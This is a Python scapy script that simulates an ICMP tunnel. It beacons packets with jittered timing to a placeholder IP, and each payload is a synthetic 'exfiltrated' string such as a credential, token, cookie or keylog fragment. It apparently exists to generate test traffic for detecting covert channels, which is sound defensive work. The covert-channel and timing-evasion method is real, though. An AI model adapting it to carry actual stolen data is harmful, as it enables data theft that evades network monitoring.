#!/usr/bin/env python3
from scapy.all import *
import time
import random
import string
from datetime import datetime
import logging
import os

# ========================= CONFIGURATION =========================
target = "0.0.0.0" # Replace with actual target IP

LOG_FILE = os.path.expanduser("~/icmp_tunnel.log")
LOG_LEVEL = logging.INFO

# ================================================================

# Setup Logging
logging.basicConfig(
    level=LOG_LEVEL,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, mode='a'),
        logging.StreamHandler()          # Also print to console
    ]
)

logger = logging.getLogger(__name__)

def generate_fake_data():
    """Generate realistic-looking fake exfiltrated data"""
    data_types = [
        f"SESSION={random.randint(1000,9999)}:AUTH={''.join(random.choices(string.ascii_letters + string.digits, k=16))}",
        f"FILE:document_{random.randint(1,100)}.pdf:{random.randint(1024,1048576)}",
        f"KEYLOG:{''.join(random.choices(string.ascii_lowercase, k=random.randint(10,30)))}",
        f"CRED:user{random.randint(1,100)}@domain.com:Pass{random.randint(1000,9999)}!",
        f"TOKEN:eyJ{''.join(random.choices(string.ascii_letters + string.digits, k=32))}",
        f"COOKIE:session={''.join(random.choices(string.ascii_letters + string.digits, k=24))}",
        f"DB:SELECT * FROM users WHERE id={random.randint(1,1000)}",
    ]
    return random.choice(data_types)


def icmp_beacon(target, interval=5, jitter=1.0, duration=120):
    """Send beacon with timing variations and logging"""
    logger.info("Starting Advanced ICMP Tunnel")
    logger.info(f"Target          : {target}")
    logger.info(f"Base Interval   : {interval}s ±{jitter}s jitter")
    logger.info(f"Duration        : {duration} seconds")
    logger.info(f"Log File        : {LOG_FILE}\n")

    start_time = time.time()
    seq = 1
    packets_sent = 0

    try:
        while (time.time() - start_time) < duration:
            adjusted_interval = interval + random.uniform(-jitter, jitter)
            adjusted_interval = max(0.5, adjusted_interval)

            data = generate_fake_data()
            payload = f"BEACON:{seq}|{data}"

            pkt = IP(dst=target)/ICMP(seq=seq % 65535)/Raw(load=payload.encode())

            send(pkt, verbose=False)
            packets_sent += 1

            # Log to both console and file
            short_data = data[:60] + "..." if len(data) > 60 else data
            logger.info(f"Seq {seq:4d} | {len(payload):3d} bytes | {short_data}")

            seq += 1
            time.sleep(adjusted_interval)

    except KeyboardInterrupt:
        logger.warning("Tunnel stopped by user (Ctrl+C)")
    except Exception as e:
        logger.error(f"Error occurred: {e}")

    finally:
        elapsed = time.time() - start_time
        logger.info(f"Tunnel finished. Sent {packets_sent} packets in {elapsed:.1f} seconds")
        logger.info(f"Full log saved to: {LOG_FILE}\n")


if __name__ == "__main__":
    icmp_beacon(target, interval=3, jitter=1.0, duration=120)
